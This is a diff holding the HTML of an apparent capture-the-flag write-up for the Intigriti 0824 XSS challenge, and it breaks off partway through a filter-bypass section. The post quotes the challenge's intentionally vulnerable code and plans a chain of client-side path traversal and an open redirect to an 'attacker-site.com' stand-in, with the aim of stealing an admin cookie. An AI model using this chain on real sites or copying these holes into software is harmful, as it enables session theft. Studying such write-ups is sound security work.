@@ -1,117 +1,1231 @@
-<!doctype html><html lang=en-us dir=ltr class=scroll-smooth data-default-appearance=auto data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en-us"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Intigriti 0824 XSS Challenge &#183; Alfin's Notes</title><meta name=title content="Intigriti 0824 XSS Challenge &#183; Alfin's Notes"><meta name=description content="Notes, writeups, and experiments"><link rel=canonical href=http://example.org/posts/intigriti-0824/><meta property="og:url" content="http://example.org/posts/intigriti-0824/"><meta property="og:site_name" content="Alfin's Notes"><meta property="og:title" content="Intigriti 0824 XSS Challenge"><meta property="og:description" content="tl;dr
-Bypassing CSPT filters and UUID validations implemented using Regex . Chaining CSPT and Open-Redirect to achieve XSS . Finally XSS and retrive the admin cookie ."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-01-05T10:17:19+05:30"><meta property="article:modified_time" content="2025-01-05T10:17:19+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="Intigriti 0824 XSS Challenge"><meta name=twitter:description content="tl;dr
-Bypassing CSPT filters and UUID validations implemented using Regex . Chaining CSPT and Open-Redirect to achieve XSS . Finally XSS and retrive the admin cookie ."><link type=text/css rel=stylesheet href=/css/main.bundle.min.adb338e6a8524dc1936ba0c3381434ae703f52055ebb38b5b7d8207b039960f20dd0f2418d153e9f4d1c36d652e0d2e9dc5f9b1132d31c48efbc469ba7f16626.css integrity="sha512-rbM45qhSTcGTa6DDOBQ0rnA/UgVeuzi1t9ggewOZYPIN0PJBjRU+n00cNtZS4NLp3F+bETLTHEjvvEabp/FmJg=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.712c423dd585dfd031bf75a70aad3af4b3de24c6eec1fef682d92724b4026b842cf843c8535587e5096039348125c57ff1bea2d46b2b4af8124673ca085880c4.js integrity="sha512-cSxCPdWF39Axv3WnCq069LPeJMbuwf72gtknJLQCa4Qs+EPIU1WH5QlgOTSBJcV/8b6i1GsrSvgSRnPKCFiAxA==" data-copy=Copy data-copied=Copied></script><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"Intigriti 0824 XSS Challenge","headline":"Intigriti 0824 XSS Challenge","inLanguage":"en-us","url":"http://example.org/posts/intigriti-0824/","author":{"@type":"Person","name":""},"copyrightYear":"2025","dateCreated":"2025-01-05T10:17:19\u002b05:30","datePublished":"2025-01-05T10:17:19\u002b05:30","dateModified":"2025-01-05T10:17:19\u002b05:30","mainEntityOfPage":"true","wordCount":"1237"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
-Skip to main content</a></div><div class="main-menu flex items-center w-full gap-2 p-1 pl-0"><a href=/ class="text-base font-medium truncate min-w-0 shrink">Alfin&rsquo;s Notes</a><div class="flex items-center ms-auto"><div class="hidden md:flex"><nav class="flex items-center gap-x-5 h-12"><a href=/posts/ class="flex items-center bf-icon-color-hover" aria-label=Posts title><span class="text-base font-medium break-normal">Posts
-</span></a><a href=/pages/about/ class="flex items-center bf-icon-color-hover" aria-label=About title><span class="text-base font-medium break-normal">About
-</span></a><button id=search-button aria-label=Search class="text-base bf-icon-color-hover" title="Search (/)">
-<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base bf-icon-color-hover"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav></div><div class="flex md:hidden"><div class="flex items-center h-14 gap-4"><button id=search-button-mobile aria-label=Search class="flex items-center justify-center bf-icon-color-hover" title="Search (/)">
-<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
-</span></button>
-<button id=appearance-switcher-mobile type=button aria-label="Dark mode switcher" class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400"><div class=dark:hidden><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden dark:block"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button>
-<input type=checkbox id=mobile-menu-toggle autocomplete=off class="hidden peer">
-<label for=mobile-menu-toggle class="flex items-center justify-center cursor-pointer bf-icon-color-hover"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></label><div role=dialog aria-modal=true style=scrollbar-gutter:stable class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
-bf-scrollbar"><label for=mobile-menu-toggle class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></label><nav class="mx-auto max-w-md space-y-6"><div class=px-2><a href=/posts/ aria-label=Posts class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title class="text-2xl font-bold tracking-tight">Posts</span></a></div><div class=px-2><a href=/pages/about/ aria-label=About class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title class="text-2xl font-bold tracking-tight">About</span></a></div></nav></div></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Intigriti 0824 XSS Challenge</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-01-05T10:17:19+05:30>January 5, 2025</time><span class="px-2 text-primary-500">&#183;</span><span>1237 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">6 mins</span></div></div><div class="flex author"><div class=place-self-center><div class="text-2xl sm:text-lg"></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p><strong>tl;dr</strong></p><ul><li>Bypassing CSPT filters and UUID validations implemented using Regex .</li><li>Chaining CSPT and Open-Redirect to achieve XSS .</li><li>Finally XSS and retrive the admin cookie .</li></ul><p>Intigriti dropped another awesome XSS challenge,This time created by <a href=https://x.com/_CryptoCat target=_blank rel=noreferrer>@_CryptoCat</a>. The challenge felt fairly straightforward, definitely less headbanging than usual, I managed to solve it in around 20 minutes after diving in.</p><h2 class="relative group">🔎 Challenge Overview<div id=-challenge-overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#-challenge-overview aria-label=Anchor>#</a></span></h2><p>The challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/HyPmr2DqA.png></figure></p><p>As is typical with XSS challenges, the goal was to obtain the admin bot&rsquo;s cookie, which was the flag. For that we needed XSS.</p><p>Firstly taking a closer look at the 2 features, which are</p><ul><li>Create Note</li><li>View Note</li></ul><h2 class="relative group">1) Create Note<div id=1-create-note class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#1-create-note aria-label=Anchor>#</a></span></h2><p>The Create Note feature is straightforward. It sends a request to <code>/api/notes/fetch</code>, creating a note with a unique UUID. The note can then be viewed by navigating to <code>/view?note-uuid</code> .</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>@main.route(&#39;/api/notes/store&#39;, methods=[&#39;POST&#39;])
-</span></span><span style=display:flex><span>@login_required
-</span></span><span style=display:flex><span>def store():
-</span></span><span style=display:flex><span>    data = request.get_json()
-</span></span><span style=display:flex><span>    content = data.get(&#39;content&#39;)
-</span></span><span style=display:flex><span>    # Server-side XSS protection
-</span></span><span style=display:flex><span>    sanitized_content = bleach.clean(content)
-</span></span><span style=display:flex><span>    note = Note.query.filter_by(user_id=current_user.id).first()
-</span></span><span style=display:flex><span>    if note:
-</span></span><span style=display:flex><span>        note.content = sanitized_content
-</span></span><span style=display:flex><span>    else:
-</span></span><span style=display:flex><span>        note = Note(user_id=current_user.id, content=sanitized_content)
-</span></span><span style=display:flex><span>        db.session.add(note)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    db.session.commit()
-</span></span><span style=display:flex><span>    return jsonify({&#39;success&#39;: &#39;Note stored&#39;, &#39;note_id&#39;: note.id})</span></span></code></pre></div></div><p>The note content is sanitized server-side using the Bleach library, so this eliminates any possibility of any quick XSS.But still we had a harmless <strong>Html injection</strong>.</p><h2 class="relative group">2) View Note<div id=2-view-note class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#2-view-note aria-label=Anchor>#</a></span></h2><p>This appeared to be the real challenge. Upon checkin <code>view.html</code>, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span> <span style=color:#8be9fd;font-style:italic>window</span>.addEventListener(<span style=color:#f1fa8c>&#34;load&#34;</span>, <span style=color:#8be9fd;font-style:italic>function</span> () {
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>const</span> urlParams <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> URLSearchParams(<span style=color:#8be9fd;font-style:italic>window</span>.location.search);
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>const</span> noteId <span style=color:#ff79c6>=</span> urlParams.get(<span style=color:#f1fa8c>&#34;note&#34;</span>);
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (noteId) {
-</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;note-id-input&#34;</span>).value <span style=color:#ff79c6>=</span> noteId;
-</span></span><span style=display:flex><span>            validateAndFetchNote(noteId);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    });</span></span></code></pre></div></div><p>Immediately, my mind turned to <strong>CSPT (Client-Side Path Traversal)</strong>, given that we had control over the fetch request.</p><blockquote><p>Client Side Path Traversal attacks arises when a web application loads some content using XHR(XmlHTTPRequests) or fetch() and the user have control over some section of the path where to load the resource.</p></blockquote><p>Taking a look at the <code>validateAndFetchNote()</code> function</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>function</span> validateAndFetchNote(noteId) {
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (noteId <span style=color:#ff79c6>&amp;&amp;</span> isValidUUID(noteId.trim())) {
-</span></span><span style=display:flex><span>            history.pushState(<span style=color:#ff79c6>null</span>, <span style=color:#f1fa8c>&#34;&#34;</span>, <span style=color:#f1fa8c>&#34;?note=&#34;</span> <span style=color:#ff79c6>+</span> noteId);
-</span></span><span style=display:flex><span>            fetchNoteById(noteId);
-</span></span><span style=display:flex><span>        } <span style=color:#ff79c6>else</span> {
-</span></span><span style=display:flex><span>            showFlashMessage(
-</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;Please enter a valid note ID,&#34;</span>,
-</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;danger&#34;</span>
-</span></span><span style=display:flex><span>            );
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }</span></span></code></pre></div></div><p>Looks like there are some checks after all .</p><p>It only fetched notes with valid UUIDs using the <code>isValidUUID()</code> function. Additionally, the fetchNoteByID() function had a CSPT check before making the actual fetch by using <code>noteId.includes("../")</code> .</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>function</span> fetchNoteById(noteId) {
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (noteId.includes(<span style=color:#f1fa8c>&#34;../&#34;</span>)) {
-</span></span><span style=display:flex><span>            showFlashMessage(<span style=color:#f1fa8c>&#34;Input not allowed!&#34;</span>, <span style=color:#f1fa8c>&#34;danger&#34;</span>);
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span>;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        fetch(<span style=color:#f1fa8c>&#34;/api/notes/fetch/&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>decodeURIComponent</span>(noteId), {
-</span></span><span style=display:flex><span>            method<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;GET&#34;</span>,
-</span></span><span style=display:flex><span>            headers<span style=color:#ff79c6>:</span> {
-</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;X-CSRFToken&#34;</span><span style=color:#ff79c6>:</span> csrf_token,
-</span></span><span style=display:flex><span>            },
-</span></span><span style=display:flex><span>        })
-</span></span><span style=display:flex><span>            .then((response) =&gt; response.json())
-</span></span><span style=display:flex><span>            .then((data) =&gt; {
-</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (data.content) {
-</span></span><span style=display:flex><span>                    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;note-content&#34;</span>).innerHTML <span style=color:#ff79c6>=</span>
-</span></span><span style=display:flex><span>                        DOMPurify.sanitize(data.content);
-</span></span><span style=display:flex><span>                    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(
-</span></span><span style=display:flex><span>                        <span style=color:#f1fa8c>&#34;note-content-section&#34;</span>
-</span></span><span style=display:flex><span>                    ).style.display <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;block&#34;</span>;
-</span></span><span style=display:flex><span>                    showFlashMessage(<span style=color:#f1fa8c>&#34;Note loaded successfully!&#34;</span>, <span style=color:#f1fa8c>&#34;success&#34;</span>);
-</span></span><span style=display:flex><span>                } <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> (data.error) {
-</span></span><span style=display:flex><span>                    showFlashMessage(<span style=color:#f1fa8c>&#34;Error: &#34;</span> <span style=color:#ff79c6>+</span> data.error, <span style=color:#f1fa8c>&#34;danger&#34;</span>);
-</span></span><span style=display:flex><span>                } <span style=color:#ff79c6>else</span> {
-</span></span><span style=display:flex><span>                    showFlashMessage(<span style=color:#f1fa8c>&#34;Note doesn&#39;t exist.&#34;</span>, <span style=color:#f1fa8c>&#34;info&#34;</span>);
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (data.debug) {
-</span></span><span style=display:flex><span>                    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;debug-content&#34;</span>).outerHTML <span style=color:#ff79c6>=</span>
-</span></span><span style=display:flex><span>                        data.debug;
-</span></span><span style=display:flex><span>                    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(
-</span></span><span style=display:flex><span>                        <span style=color:#f1fa8c>&#34;debug-content-section&#34;</span>
-</span></span><span style=display:flex><span>                    ).style.display <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;block&#34;</span>;
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>            });
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    
-</span></span></code></pre></div></div><p>When our note is fetched, the server returns a JSON object containing the note&rsquo;s content. This content is then rendered using innerHTML, with DOMPurify applied to sanitize it, effectively preventing XSS.</p><p>However, if the JSON response includes a debug key, its value is rendered using <strong>outerHTML</strong> without any sanitization, which can be used to get XSS .</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span> <span style=color:#ff79c6>if</span> (data.debug) {
-</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;debug-content&#34;</span>).outerHTML <span style=color:#ff79c6>=</span> data.debug;
-</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(
-</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#34;debug-content-section&#34;</span>
-</span></span><span style=display:flex><span>        ).style.display <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;block&#34;</span>;
-</span></span><span style=display:flex><span>}</span></span></code></pre></div></div><h2 class="relative group">🥷 Attack plan<div id=-attack-plan class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#-attack-plan aria-label=Anchor>#</a></span></h2><p>The plan is to manipulate the fetch request so that it returns a JSON object containing a <strong>debug</strong> key. However, the server only responds with a JSON object that includes a <strong>content key</strong> and the note’s content, with no way to modify this server response directly. The only method to achieve this would be to return the <strong>modified JSON from our own server</strong>.</p><p>However, we only have CSPT (Client-Side Path Traversal) at our disposal, which allows us to control the path of the fetch() request. This means we can only direct the fetch to different endpoints .</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>fetch(<span style=color:#f1fa8c>&#34;/api/notes/fetch/&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>decodeURIComponent</span>(noteId))</span></span></code></pre></div></div><p>Unless there is an <strong>Open-Redirect</strong> in any of the endpoints !!</p><p>If we have an <strong>Open-redirect</strong>, we can use the CSPT to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker&rsquo;s server. From there, we can respond with a JSON object that includes the debug key, containing our XSS payload.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=finalXSS src=https://hackmd.io/_uploads/Sy56QfKcR.png></figure></p><h2 class="relative group">Open Redirect<div id=open-redirect class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#open-redirect aria-label=Anchor>#</a></span></h2><p>There is an endpoint named <code>/contact</code> that accepts a query parameter called <strong>return</strong>. This endpoint will redirect the user to the URL specified by the value of the return parameter.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>@main.route(<span style=color:#f1fa8c>&#39;/contact&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>, <span style=color:#f1fa8c>&#39;POST&#39;</span>])
-</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>contact</span>():
-</span></span><span style=display:flex><span>    form <span style=color:#ff79c6>=</span> ContactForm()
-</span></span><span style=display:flex><span>    return_url <span style=color:#ff79c6>=</span> request<span style=color:#ff79c6>.</span>args<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;return&#39;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> request<span style=color:#ff79c6>.</span>method <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;POST&#39;</span>:
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> form<span style=color:#ff79c6>.</span>validate_on_submit():
-</span></span><span style=display:flex><span>            flash(<span style=color:#f1fa8c>&#39;Thank you for your message!&#39;</span>, <span style=color:#f1fa8c>&#39;success&#39;</span>)
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> return_url <span style=color:#ff79c6>and</span> is_safe_url(return_url):
-</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> redirect(return_url)
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> redirect(url_for(<span style=color:#f1fa8c>&#39;main.home&#39;</span>))
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> return_url <span style=color:#ff79c6>and</span> is_safe_url(return_url):
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> redirect(return_url)
-</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> render_template(<span style=color:#f1fa8c>&#39;contact.html&#39;</span>, form<span style=color:#ff79c6>=</span>form, return_url<span style=color:#ff79c6>=</span>return_url)</span></span></code></pre></div></div><p>So now we can redirect to the attackers site by just giving the attacker site as the return query parameter.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>                  <span style=color:#ff79c6>/</span>contact?<span style=color:#ff79c6>return</span><span style=color:#ff79c6>=</span>https:<span style=color:#ff79c6>//</span>attacker<span style=color:#ff79c6>-</span>site<span style=color:#ff79c6>.</span>com</span></span></code></pre></div></div><h2 class="relative group">Bypassing the CSPT Filters<div id=bypassing-the-cspt-filters class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#bypassing-the-cspt-filters aria-label=Anchor>#</a></span></h2><p>Now that we have Open-Redirect in the /contact endpoint all we have to do is path traverse to that endpoint using CSPT.However we have to bypass a few checks for that.</p><ul><li>The note uuid check -> <strong>isValidUUID()</strong> function</li><li>Path traversal check -> <strong>noteId.includes("../")</strong></li></ul><h3 class="relative group">Bypassing isValidUUID<div id=bypassing-isvaliduuid class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#bypassing-isvaliduuid aria-label=Anchor>#</a></span></h3><p>Looking a bit closer at the 